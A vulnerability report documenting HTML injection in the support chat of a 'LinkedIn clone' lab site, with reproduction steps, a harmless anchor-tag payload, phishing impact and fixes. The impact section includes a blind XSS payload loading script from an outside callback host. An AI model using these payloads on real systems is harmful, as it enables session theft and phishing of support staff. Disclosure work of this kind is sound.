## Title
HTML Injection via Chat Message Field - LinkedIn Clone Support Chat

## Vulnerability Type
HTML Injection (Stored / Chat Context)

## Summary
The LinkedIn clone support chat at `https://kzlabs.in/subdomains/chat/` renders user-supplied chat messages as raw HTML without sanitization or output encoding. When a user sends a message containing HTML tags (e.g. `<a href="...">Click me</a>`), the injected markup renders as a real, clickable hyperlink in the chat interface — both for the sender and for anyone (including support staff) viewing the conversation. This creates a direct phishing vector inside a trusted chat interface on a legitimate domain.

## Vulnerable Endpoint
`https://kzlabs.in/subdomains/chat/`

**Injection point:** Chat message input field (bottom of chat widget)

## Steps to Reproduce
1. Navigate to `https://kzlabs.in/subdomains/chat/`
2. Open the support chat widget.
3. In the message input field, type the following payload:
   ```
   <a href="https://bing.com">Click me</a>
   ```
4. Send the message.
5. Observe that the message renders as a real, clickable hyperlink in the chat - confirming raw HTML is being rendered instead of plain text.

## Payload Used
```html
<a href="https://bing.com">Click me</a>
```

## Impact
HTML Injection in a chat/support interface carries elevated real-world impact compared to a standard search bar because:

- **Support staff are primary targets** - messages are reviewed by agents in an admin/internal panel. A malicious link appearing as a legitimate-looking URL inside a support ticket is far more likely to be clicked by a staff member than by a regular user — especially if the link text mimics an internal tool or document.
- **Phishing on a trusted domain** - the injected link appears inside `kzlabs.in`, not a suspicious external domain. Victims see a legitimate URL in the address bar and a real-looking link in the chat, making credential harvesting highly effective.
- **Fake login / payment overlays** - an attacker can inject full HTML forms or images designed to look like platform UI, tricking users into submitting credentials or card details.
- **Malicious redirects** - a link disguised as "Verify your account" or "View your invoice" can redirect victims to attacker-controlled phishing pages.
- **Escalation to Blind XSS** - if the support chat messages are rendered in an admin panel, the same injection point may execute scripts if the filter is bypassed — worth testing with a Blind XSS payload (`<script src=https://xss.report/c/tanishq></script>`) in the same field.

## Recommendations for Fix
1. Treat all chat message content as plain text - render it using `textContent` (JS) or `htmlspecialchars($msg, ENT_QUOTES, 'UTF-8')` (PHP) rather than `innerHTML` or raw HTML output. This neutralizes all HTML tags regardless of content.
2. If rich text / formatted messages are intentionally supported (bold, italic), use a strict allowlist-based HTML sanitizer (e.g. DOMPurify on the client side) that permits only safe formatting tags and explicitly strips `<a>`, `<img>`, `<script>`, and all event-handler attributes.
3. Apply the same sanitization in the **agent/admin view** of the chat, not just the public-facing widget - support staff are the higher-value target in this attack scenario.
4. Add a Content-Security-Policy header restricting `script-src` and `default-src` to prevent escalation to XSS if sanitization is incomplete.
